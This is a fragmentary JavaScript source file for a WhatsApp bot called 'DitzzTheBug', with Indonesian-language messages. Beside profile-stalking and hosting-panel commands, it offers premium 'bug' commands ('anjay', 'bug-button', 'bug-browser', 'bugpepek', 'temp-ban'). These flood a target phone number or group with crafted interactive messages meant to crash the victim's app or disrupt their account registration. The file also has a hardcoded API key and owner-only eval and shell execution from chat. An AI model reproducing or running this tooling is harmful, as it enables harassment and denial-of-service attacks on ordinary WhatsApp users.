let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
ditzzreply(`*/ Mobile Legend Stalker \\*
...
//=================================================//
case 'npmstalk':{
if (!q) return ditzzreply(`Example ${prefix+command} xeonapi`)
ditzzreply(mess.wait)
eha = await npmstalk.npmstalk(q)
ditzzreply(`*/ Npm Stalker \\*
...
if (!q) return ditzzreply(`Example ${prefix+command} DGXeon`)
ditzzreply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
ditzzBug.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*
...
//Panel
case 'listram': {
ditzzreply(` ╭ ──▸ ListRam ( ${global.namabot} )
 │
 │ 𖣂 Sc Private 𖤲 <特> 𖤲
 │名前 : ${m.pushName}}
...
await ditzzBug.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
ditzzreply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;
...
if (!isDeveloper) return ditzzreply(mess.owner)
let srv = args[0]
if (!srv) return ditzzreply('ID nya mana?')
...
if (res.errors) return ditzzreply('Server tidak ditemukan')
ditzzreply('Berhasil minghapus Server.')
}
break
//=================================================//
case "listusr": {
...
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
ditzzreply(`Gunakan perintah ${prefix ? prefix : '.'}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break
//=================================================//
...
if (!isDeveloper) return ditzzreply(mess.owner)
let usr = args[0]
if (!usr) return ditzzreply('ID nya mana?')
...
if (res.errors) return ditzzreply('User tidak ditemukan')
ditzzreply('Berhasil menghapus User')
}
break
//=================================================//
case "addsrv": {
if (!isDeveloper) return ditzzreply(mess.owner)
let s = text.split(',');
if (s.length < 7) return ditzzreply(`> *Format salah!*
...
let res = await f.json()
if (res.errors) return ditzzreply(JSON.stringify(res.errors[0], null, 2))
...
case '1gb': {
if(!isReseller){
ditzzreply(mess.seller)
}
if (!isDeveloper) return ditzzreply(mess.owner)
let t = text.split(',');
if (t.length < 2) return ditzzreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
...
if (!u) return
let d = (await ditzzBug.onWhatsApp(u.split`@`[0]))[0] || {}
...
if (data.errors) return ditzzreply(JSON.stringify(data.errors[0], null, 2));
...
ditzzreply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ditzzBug.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
...
if (res.errors) return ditzzreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await ditzzreply(`Sukses menambahkan User dan Server
...
//=================================================//
case "check-host": {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} https://nxnn.com`)
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "DitzzTheBug © DitzzTheBug Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
ditzzBug.relayMessage(m.chat, msg, {});
}
break
//=================================================//
case "brutal":
...
case "anjay":{
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return ditzzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await ditzzreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
...
ditzzreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
...
await ditzzreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
...
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
...
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
ditzzreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
ditzzreply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
ditzzreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ditzzBug.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
...
await ditzzBug.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
ditzzreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
...
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} 1962623836281@g.us`)
ditzzreply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
...
//=================================================//
case 'temp-ban': {
if (!isPremium) return ditzzreply(mess.prem)
if (!text) return ditzzreply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return ditzzreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
...
await ditzzreply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
...
case 'cekprovider': {
if (!isPremium) return ditzzreply(mess.prem)
if (!text) return ditzzreply(`Example: ${prefix + command} 6287872627288`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
ditzzreply(JSON.stringify(result, null, 2));
...
} else ditzzreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else ditzzreply('Masukkan nomor yang dituju!')
}
break
//=================================================//
case 'unbanv2': {
...
case 'tesbug': {
if (!isPremium) return ditzzreply(mess.premium)
if (!q) return ditzzreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await ditzzBug.sendVideoAsSticker(m.chat, nulll2, force, { packname: 'Zero Execution Vault', author: 'DitzzTheBug Brow' })
}
}
break
...
await ditzzBug.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await ditzzreply('✅Succes')
}
break
//=================================================//
case 'bugpepek': {
...
await ditzzBug.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
...
return ditzzreply(bang)
}
try {
ditzzreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ditzzreply(String(e))
}
}
...
await ditzzreply(evaled)
} catch (err) {
await ditzzreply(String(err))
}
}
//=================================================//
if (budy.startsWith('$')) {
...
if (err) return ditzzreply(`${err}`)
if (stdout) return ditzzreply(`${stdout}`)
})
}
}
} catch (err) {
peki = async () => {
ditzzBug.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
